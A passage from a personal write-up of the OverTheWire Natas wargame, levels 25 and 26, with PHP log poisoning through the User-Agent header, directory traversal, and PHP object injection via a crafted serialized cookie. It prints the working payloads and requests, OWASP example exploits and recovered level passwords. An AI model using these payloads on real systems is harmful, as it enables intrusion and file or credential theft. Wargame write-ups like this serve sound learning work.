+</code></pre><p>natas25.natas.labs.overthewire.org/?lang=&mldr;/&mldr;//language/de</p><p>got stuck at this point. Read up on a write up.</p><p>Rhe pages echo&rsquo;s 3 values. $**GREETING, $**MSG and $__FOOTER.</p><pre><code class=language-php>echo &quot;&lt;h2&gt;$__GREETING&lt;/h2&gt;&quot;;
+echo &quot;&lt;p align=\&quot;justify\&quot;&gt;$__MSG&quot;;
+echo &quot;&lt;div align=\&quot;right\&quot;&gt;&lt;h6&gt;$__FOOTER&lt;/h6&gt;&lt;div&gt;&quot;;
+</code></pre><p>Log function adds text from UserAgent to file if its triggered.<br>It gets triggered if a directory traversal is found. This means if we add PHP code to the UserAgent we can write arbitrary code to logfiles in /var/www/natas/natas25/logs/natas25_SESSIONID.log.</p><pre><code class=language-php>function logRequest($message){
+        $log=&quot;[&quot;. date(&quot;d.m.Y H::i:s&quot;,time()) .&quot;]&quot;;
+        $log=$log . &quot; &quot; . $_SERVER['HTTP_USER_AGENT'];
+        $log=$log . &quot; \&quot;&quot; . $message .&quot;\&quot;\n&quot;;
+        $fd=fopen(&quot;/var/www/natas/natas25/logs/natas25_&quot; . session_id() .&quot;.log&quot;,&quot;a&quot;);
+        fwrite($fd,$log);
+        fclose($fd);
+    }
+</code></pre><p>If we overwrite either $**GREETING, $**MSG or $__FOOTER by passing PHP code in the UserAgent we can get output back from our arbitrary code.</p><pre><code class=language-text>User-Agent: &lt;?php global $__MSG; global $__FOOTER; global $__GREETING; $__MSG=file_get_contents('/etc/natas_webpass/natas26'); $__GREETING=$__MSG; $__FOOTER=$__MSG; ?&gt;
+</code></pre><p>Since the safeinclude does not stop the request we can first trigger a log with a <code>../</code> and then add the <code>.../...//</code> for actual directory traversal.</p><p>So if we combine these 2</p><pre><code class=language-text>GET /?lang=../.../...//logs/natas25_0fopbbtghrlijbe403knpoa5v5.log HTTP/1.1
+Host: natas25.natas.labs.overthewire.org
+User-Agent: &lt;?php global $__MSG; global $__FOOTER; global $__GREETING; $__MSG=file_get_contents('/etc/natas_webpass/natas26'); $__GREETING=$__MSG; $__FOOTER=$__MSG; ?&gt;
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Authorization: Basic bmF0YXMyNTpHSEY2WDdZd0FDYVlZc3NIVlkwNWNGcTgzaFJrdGw0Yw==
+Connection: close
+Cookie: __cfduid=dc2e23c92b1d237ff6fcd21eeaace26841568619071; __utma=176859643.1037695426.1568619071.1568619071.1568619071.1; __utmz=176859643.1568619071.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); PHPSESSID=0fopbbtghrlijbe403knpoa5v5
+Upgrade-Insecure-Requests: 1
+</code></pre><pre><code class=language-text>[23.09.2019 09::29:37]  &quot;Directory traversal attempt! fixing request.&quot;
+[23.09.2019 09::30:35]  &quot;Directory traversal attempt! fixing request.&quot;
+&lt;h2&gt;oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T
+&lt;/h2&gt;&lt;p align=&quot;justify&quot;&gt;oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T
+&lt;div align=&quot;right&quot;&gt;&lt;h6&gt;oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T
+</code></pre><p>oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T</p><h3 id=natas27>natas27</h3><pre><code class=language-php>&lt;?php
+    // sry, this is ugly as hell.
+    // cheers kaliman ;)
+    // - morla
+
+    class Logger{
+        private $logFile;
+        private $initMsg;
+        private $exitMsg;
+
+        function __construct($file){
+            // initialise variables
+            $this-&gt;initMsg=&quot;#--session started--#\n&quot;;
+            $this-&gt;exitMsg=&quot;#--session end--#\n&quot;;
+            $this-&gt;logFile = &quot;/tmp/natas26_&quot; . $file . &quot;.log&quot;;
+
+            // write initial message
+            $fd=fopen($this-&gt;logFile,&quot;a+&quot;);
+            fwrite($fd,$initMsg);
+            fclose($fd);
+        }
+
+        function log($msg){
+            $fd=fopen($this-&gt;logFile,&quot;a+&quot;);
+            fwrite($fd,$msg.&quot;\n&quot;);
+            fclose($fd);
+        }
+
+        function __destruct(){
+            // write exit message
+            $fd=fopen($this-&gt;logFile,&quot;a+&quot;);
+            fwrite($fd,$this-&gt;exitMsg);
+            fclose($fd);
+        }
+    }
+
+    function showImage($filename){
+        if(file_exists($filename))
+            echo &quot;&lt;img src=\&quot;$filename\&quot;&gt;&quot;;
+    }
+
+    function drawImage($filename){
+        $img=imagecreatetruecolor(400,300);
+        drawFromUserdata($img);
+        imagepng($img,$filename);
+        imagedestroy($img);
+    }
+
+    function drawFromUserdata($img){
+        if( array_key_exists(&quot;x1&quot;, $_GET) &amp;&amp; array_key_exists(&quot;y1&quot;, $_GET) &amp;&amp;
+            array_key_exists(&quot;x2&quot;, $_GET) &amp;&amp; array_key_exists(&quot;y2&quot;, $_GET)){
+
+            $color=imagecolorallocate($img,0xff,0x12,0x1c);
+            imageline($img,$_GET[&quot;x1&quot;], $_GET[&quot;y1&quot;],
+                            $_GET[&quot;x2&quot;], $_GET[&quot;y2&quot;], $color);
+        }
+
+        if (array_key_exists(&quot;drawing&quot;, $_COOKIE)){
+            $drawing=unserialize(base64_decode($_COOKIE[&quot;drawing&quot;]));
+            if($drawing)
+                foreach($drawing as $object)
+                    if( array_key_exists(&quot;x1&quot;, $object) &amp;&amp;
+                        array_key_exists(&quot;y1&quot;, $object) &amp;&amp;
+                        array_key_exists(&quot;x2&quot;, $object) &amp;&amp;
+                        array_key_exists(&quot;y2&quot;, $object)){
+                            $color=imagecolorallocate($img,0xff,0x12,0x1c);
+                            imageline($img,$object[&quot;x1&quot;],$object[&quot;y1&quot;],
+                                    $object[&quot;x2&quot;] ,$object[&quot;y2&quot;] ,$color)
+                        }
+        }
+    }
+
+    function storeData(){
+        $new_object=array();
+
+        if(array_key_exists(&quot;x1&quot;, $_GET) &amp;&amp; array_key_exists(&quot;y1&quot;, $_GET) &amp;&amp;
+            array_key_exists(&quot;x2&quot;, $_GET) &amp;&amp; array_key_exists(&quot;y2&quot;, $_GET)){
+            $new_object[&quot;x1&quot;]=$_GET[&quot;x1&quot;];
+            $new_object[&quot;y1&quot;]=$_GET[&quot;y1&quot;];
+            $new_object[&quot;x2&quot;]=$_GET[&quot;x2&quot;];
+            $new_object[&quot;y2&quot;]=$_GET[&quot;y2&quot;];
+        }
+
+        if (array_key_exists(&quot;drawing&quot;, $_COOKIE)){
+            $drawing=unserialize(base64_decode($_COOKIE[&quot;drawing&quot;]));
+        }
+        else{
+            // create new array
+            $drawing=array();
+        }
+
+        $drawing[]=$new_object;
+        setcookie(&quot;drawing&quot;,base64_encode(serialize($drawing)));
+    }
+?&gt;
+</code></pre><pre><code class=language-php>&lt;?php
+    session_start();
+
+    if (array_key_exists(&quot;drawing&quot;, $_COOKIE) ||
+        (   array_key_exists(&quot;x1&quot;, $_GET) &amp;&amp; array_key_exists(&quot;y1&quot;, $_GET) &amp;&amp;
+            array_key_exists(&quot;x2&quot;, $_GET) &amp;&amp; array_key_exists(&quot;y2&quot;, $_GET))){
+        $imgfile=&quot;img/natas26_&quot; . session_id() .&quot;.png&quot;;
+        drawImage($imgfile);
+        showImage($imgfile);
+        storeData();
+    }
+
+?&gt;
+</code></pre><pre><code class=language-text>GET /?x1=10&amp;y1=10&amp;x2=10&amp;y2=10 HTTP/1.1
+Host: natas26.natas.labs.overthewire.org
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:69.0) Gecko/20100101 Firefox/69.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Authorization: Basic bmF0YXMyNjpvR2dXQUo3emNHVDI4dllhekdvNHJraE9QRGhCdTM0VA==
+Connection: close
+Referer: http://natas26.natas.labs.overthewire.org/
+Cookie: __cfduid=dc2e23c92b1d237ff6fcd21eeaace26841568619071; __utma=176859643.1037695426.1568619071.1568619071.1568619071.1; __utmz=176859643.1568619071.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); PHPSESSID=nrf0sdktpqu2fdfgld75cb10s5
+Upgrade-Insecure-Requests: 1
+Pragma: no-cache
+Cache-Control: no-cache
+</code></pre><p>drawing=YToxOntpOjA7YTo0OntzOjI6IngxIjtzOjI6IjEwIjtzOjI6InkxIjtzOjI6IjEwIjtzOjI6IngyIjtzOjI6IjEwIjtzOjI6InkyIjtzOjI6IjEwIjt9fQ%3D%3D</p><p>echo &ldquo;YToxOntpOjA7YTo0OntzOjI6IngxIjtzOjI6IjEwIjtzOjI6InkxIjtzOjI6IjEwIjtzOjI6IngyIjtzOjI6IjEwIjtzOjI6InkyIjtzOjI6IjEwIjt9fQ==&rdquo; | base64 -d a:1:{i:0;a:4:{s:2:&ldquo;x1&rdquo;;s:2:&ldquo;10&rdquo;;s:2:&ldquo;y1&rdquo;;s:2:&ldquo;10&rdquo;;s:2:&ldquo;x2&rdquo;;s:2:&ldquo;10&rdquo;;s:2:&ldquo;y2&rdquo;;s:2:&ldquo;10&rdquo;;}} Array ( [0] => Array ( [x1] => 10 [y1] => 10 [x2] => 10 [y2] => 10 )</p><p>)</p><p>A Array is serialized and stored as base64 in a cookie called drawing. This means we can send over our own php as the cookie.</p><p><a href="https://www.youtube.com/watch?v=uS37TujnLRw">https://www.youtube.com/watch?v=uS37TujnLRw</a></p><p>serializeing data is just a way to export an some data from ram to some other place, like disk or over the network. Deserializeing data takes the seerialezed data and imports it. Serialized data is usally JSON, YAML or XML.<br>PHP uses JSON.</p><p>Could not get past this point, this is mostly caused by my lack of programming knowlodge.</p><p>Never worked with classes, let alone construct or decstruct.<br>Never worked with serializeing/deserializeing.</p><p>Used another write anD OWASP up to understand it what was going on.</p><p><a href=https://www.owasp.org/index.php/PHP_Object_Injection>https://www.owasp.org/index.php/PHP_Object_Injection</a></p><pre><code class=language-text>PHP Object Injection is an application level vulnerability that could allow an attacker to perform different kinds of malicious attacks, such as Code Injection, SQL Injection, Path Traversal and Application Denial of Service, depending on the context. The vulnerability occurs when user-supplied input is not properly sanitized before being passed to the unserialize() PHP function. Since PHP allows object serialization, attackers could pass ad-hoc serialized strings to a vulnerable unserialize() call, resulting in an arbitrary PHP object(s) injection into the application scope.
+
+In order to successfully exploit a PHP Object Injection vulnerability two conditions must be met:
+
+    The application must have a class which implements a PHP magic method (such as __wakeup or __destruct) that can be used to carry out malicious attacks, or to start a &quot;POP chain&quot;.
+    All of the classes used during the attack must be declared when the vulnerable unserialize() is being called, otherwise object autoloading must be supported for such classes.
+</code></pre><pre><code class=language-text>class Example1
+{
+   public $cache_file;
+
+   function __construct()
+   {
+      // some PHP code...
+   }
+
+   function __destruct()
+   {
+      $file = &quot;/var/www/cache/tmp/{$this-&gt;cache_file}&quot;;
+      if (file_exists($file)) @unlink($file);
+   }
+}
+
+// some PHP code...
+
+$user_data = unserialize($_GET['data']);
+
+// some PHP code...
+</code></pre><pre><code class=language-text>In this example an attacker might be able to delete an arbitrary file via a Path Traversal attack, for e.g. requesting the following URL:
+
+http://testsite.com/vuln.php?data=O:8:&quot;Example1&quot;:1:{s:10:&quot;cache_file&quot;;s:15:&quot;../../index.php&quot;;}
+</code></pre><pre><code class=language-text>Example 2
+
+The example below shows a PHP class with an exploitable __wakeup method:
+
+class Example2
+{
+   private $hook;
+
+   function __construct()
+   {
+      // some PHP code...
+   }
+
+   function __wakeup()
+   {
+      if (isset($this-&gt;hook)) eval($this-&gt;hook);
+   }
+}
+
+// some PHP code...
+
+$user_data = unserialize($_COOKIE['data']);
+
+// some PHP code...
+</code></pre><pre><code class=language-text>In this example an attacker might be able to perform a Code Injection attack by sending an HTTP request like this:
+
+GET /vuln.php HTTP/1.0
+Host: testsite.com
+Cookie: data=O%3A8%3A%22Example2%22%3A1%3A%7Bs%3A14%3A%22%00Example2%00hook%22%3Bs%3A10%3A%22phpinfo%28%29%3B%22%3B%7D
+Connection: close
+</code></pre><pre><code class=language-text>data=O:8:&quot;Example2&quot;:1:{s:14:&quot;Example2&quot;:&quot;hook&quot;;s:10:&quot;phpinfo();&quot;;}
+</code></pre><pre><code class=language-text>Where the cookie parameter &quot;data&quot; has been generated by the following script:
+
+class Example2
+{
+   private $hook = &quot;phpinfo();&quot;;
+}
+
+print urlencode(serialize(new Example2));
+</code></pre><pre><code class=language-text>Example 3
+
+This last example shows how it is possible to perform a SQL Injection attack using a &quot;POP chain&quot;, for instance by leveraging a __toString method like this:
+
+class Example3
+{
+   protected $obj;
+
+   function __construct()
+   {
+      // some PHP code...
+   }
+
+   function __toString()
+   {
+      if (isset($this-&gt;obj)) return $this-&gt;obj-&gt;getValue();
+   }
+}
+
+// some PHP code...
+
+$user_data = unserialize($_POST['data']);
+
+// some PHP code...
+
+If the $user_data variable is an &quot;Example3&quot; object and it will be treated like a string somewhere in the code, then its __toString method will be called. Since this method will call the getValue method of the object stored into the &quot;obj&quot; property, it's possible to set that property to an arbitrary object, and execute its getValue method, if it is accessible, otherwise its __call method will be called, if it is defined. For the sake of ease, just think that when unserialize() is called, the class below is available within the application scope (or supported by autoloading):
+
+class SQL_Row_Value
+{
+   private $_table;
+
+   // some PHP code...
+
+   function getValue($id)
+   {
+      $sql = &quot;SELECT * FROM {$this-&gt;_table} WHERE id = &quot; . (int)$id;
+      $result = mysql_query($sql, $DBFactory::getConnection());
+      $row = mysql_fetch_assoc($result);
+
+      return $row['value'];
+   }
+}
+
+In this example an attacker might be able to perform a SQL Injection attack by sending a POST request containing a &quot;data&quot; parameter generated by a script like this:
+
+class SQL_Row_Value
+{
+   private $_table = &quot;SQL Injection&quot;;
+}
+
+class Example3
+{
+   protected $obj;
+
+   function __construct()
+   {
+      $this-&gt;obj = new SQL_Row_Value;
+   }
+}
+
+print urlencode(serialize(new Example3));
+</code></pre><p><a href=https://n0j.github.io/2017/07/19/otw-natas-26.html>https://n0j.github.io/2017/07/19/otw-natas-26.html</a><br><a href=https://n0j.github.io/2016/09/16/tryharder-php-object.html>https://n0j.github.io/2016/09/16/tryharder-php-object.html</a></p><pre><code class=language-text>Often the way serialization bugs go is something occurs during an object’s constructor or destructor that the attacker can commandeer for nefarious purposes. I wrote about another PHP object serialization challenge here where the contents of a member variable were executed as a command in the constructor.
+</code></pre><pre><code class=language-text>a constructor is a function which is called automatically when an instance of a class is created and a destructor is a function automatically called when an instance is destroyed. In PHP these are denoted by __construct() and __destruct() in the class definition.
+</code></pre><pre><code class=language-text>Check out the Logger class. Both the constructor and destructor write to a file. What file? Whatever is stored in the $logFile member variable. What does it write? What ever is stored in the $initMsg and $exitMsg member variables. Ch-ching.
+
+Recall that the definition of the class does not go along for the ride when an object is serialized. We only need to make a class named Logger, load up the member variables we want, and send it along. To do that, another short program on the side.
+</code></pre><p><a href=https://www.php.net/manual/en/language.oop5.serialization.php>https://www.php.net/manual/en/language.oop5.serialization.php</a></p><pre><code class=language-php>class Logger {
+    private $logFile;
+    private $initMsg;
+    private $exitMsg;
+
+    function __construct(){
+        $this-&gt;initMsg=&quot;heyyyyyy\n&quot;;
+        $this-&gt;exitMsg=&quot;&lt;?php echo file_get_contents('/etc/natas_webpass/natas27'); ?&gt;\n&quot;;
+        $this-&gt;logFile= &quot;/var/www/natas/natas26/img/n0j.php&quot;;
+    }
+}
+
+$o = new Logger();
+print base64_encode(serialize($o)).&quot;\n&quot;;
+Tzo2OiJMb2dnZXIiOjM6e3M6MTU6IgBMb2dnZXIAbG9nRmlsZSI7czozNDoiL3Zhci93d3cvbmF0YXMvbmF0YXMyNi9pbWcvbjBqLnR4dCI7czoxNToiAExvZ2dlcgBpbml0TXNnIjtzOjk6ImhleXl5eXl5CiI7czoxNToiAExvZ2dlcgBleGl0TXNnIjtzOjYzOiI8P3BocCBlY2hvIGZpbGVfZ2V0X2NvbnRlbnRzKCcvZXRjL25hdGFzX3dlYnBhc3MvbmF0YXMyNycpOyA/PgoiO30=
+php &gt; exit
+@0fb5bda9f64c:/#
+echo &quot;Tzo2OiJMb2dnZXIiOjM6e3M6MTU6IgBMb2dnZXIAbG9nRmlsZSI7czozNDoiL3Zhci93d3cvbmF0YXMvbmF0YXMyNi9pbWcvbjBqLnR4dCI7czoxNToiAExvZ2dlcgBpbml0TXNnIjtzOjk6ImhleXl5eXl5CiI7czoxNToiAExvZ2dlcgBleGl0TXNnIjtzOjYzOiI8P3BocCBlY2hvIGZpbGVfZ2V0X2NvbnRlbnRzKCcvZXRjL25hdGFzX3dlYnBhc3MvbmF0YXMyNycpOyA/PgoiO30=&quot; | base64 -d
+O:6:&quot;Logger&quot;:3:{s:15:&quot;LoggerlogFile&quot;;s:34:&quot;/var/www/natas/natas26/img/n0j.txt&quot;;s:15:&quot;LoggerinitMsg&quot;;s:9:&quot;heyyyyyy
+&quot;;s:15:&quot;LoggerexitMsg&quot;;s:63:&quot;&lt;?php echo file_get_contents('/etc/natas_webpass/natas27'); ?&gt;
+&quot;;}
+</code></pre><pre><code class=language-text>Obviously the message we’re after is the password to natas27 so we grab that and load it into a variable. We know we can write to the img folder because that’s what the application does with legitimate images. We also know we’ll be able to read it back from there, again because that’s what the application does with legitimate images.
+A note on how this works… why would we send a Logger object into a function that’s expecting arrays with coordinates and whatnot, doesn’t sound like that will work.
+Short answer - it doesn’t work!
+
+But the object is loaded into the $drawing variable so when its life ends the destructor will be called and that’s all we care about.
+</code></pre><p>so basiclly, we overwrite the variables set in the logger class at a later stage in the script. We can do this since unserialize only loads the variables from classes into the application scope, not de the defination of the class it self when the object has been serialized.</p><p>We can overwrite these values since the cookie is used to send over the serialized data and we have full control over the cookie we send.</p><p>When deserializeing the cookie the entire cookie is added to $drawing. This means our initMsg, exitMsg and logFile from our custom logger class are now loaded into the application scope and now have replaced the orginal values when the class was defined.</p><pre><code class=language-php>if (array_key_exists(&quot;drawing&quot;, $_COOKIE)){
+            $drawing=unserialize(base64_decode($_COOKIE[&quot;drawing&quot;]));
+            if($drawing)
+                foreach($drawing as $object)
+                    if( array_key_exists(&quot;x1&quot;, $object) &amp;&amp;
+                        array_key_exists(&quot;y1&quot;, $object) &amp;&amp;
+                        array_key_exists(&quot;x2&quot;, $object) &amp;&amp;
+                        array_key_exists(&quot;y2&quot;, $object)){
+                            $color=imagecolorallocate($img,0xff,0x12,0x1c);
+                            imageline($img,$object[&quot;x1&quot;],$object[&quot;y1&quot;],
+                                    $object[&quot;x2&quot;] ,$object[&quot;y2&quot;] ,$color)
+                        }
+        }
+</code></pre><p>Our overwritten variables do something since the destructors uses them. Destruct is called at the end of execution of the script which means our cookie has been loaded and replaced initMsg, exitMsg and logFile.</p><pre><code class=language-php>function __destruct(){
+            // write exit message
+            $fd=fopen($this-&gt;logFile,&quot;a+&quot;);
+            fwrite($fd,$this-&gt;exitMsg);
+            fclose($fd);
+        }
+</code></pre><p>We now open our custom log file &lsquo;img/n0j.php&rsquo; which contains <code>&lt;?php echo file_get_contents('/etc/natas_webpass/natas27'); ?>\n"</code>, so we when we load it we get the password of natas27.</p><p>55TBjpPZUUJgVP5b3BnbG6ON9uDPVzCJ</p><footer class=footline></footer></div></div><div id=navigation></div></section><div style=left:-1000px;overflow:scroll;position:absolute;top:-1000px;border:none;box-sizing:content-box;height:200px;margin:0;padding:0;width:200px><div style=border:none;box-sizing:content-box;height:200px;margin:0;padding:0;width:200px></div></div><script src=/js/clipboard.min.js></script><script src=/js/perfect-scrollbar.min.js></script><script src=/js/perfect-scrollbar.jquery.min.js></script><script src=/js/jquery.sticky.js></script><script src=/js/featherlight.min.js></script><script src=/js/highlight.pack.js></script><script>hljs.initHighlightingOnLoad();</script><script src=/js/modernizr.custom-3.6.0.js></script><script src=/js/learn.js></script><script src=/js/hugo-learn.js></script><link href=/mermaid/mermaid.css rel=stylesheet><script src=/mermaid/mermaid.js></script><script>mermaid.initialize({startOnLoad:true});</script></body></html>
